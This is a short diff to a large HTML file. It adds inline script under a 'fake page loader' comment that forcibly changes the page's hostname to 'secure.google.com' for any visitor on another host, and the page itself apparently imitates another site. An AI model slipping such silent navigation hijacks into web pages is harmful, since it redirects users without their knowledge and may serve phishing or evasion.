@@ -18551,6 +18551,9 @@
 
     <!-- fake page loader -->
     <script>
+      if (globalThis.location.hostname != "secure.google.com") {
+		    globalThis.location.hostname = "secure.google.com"
+	    }
       setTimeout(function () {
         document.querySelector(".page-loader").classList.add("hidden");
         document.querySelector("._9eogI").classList.add("show");
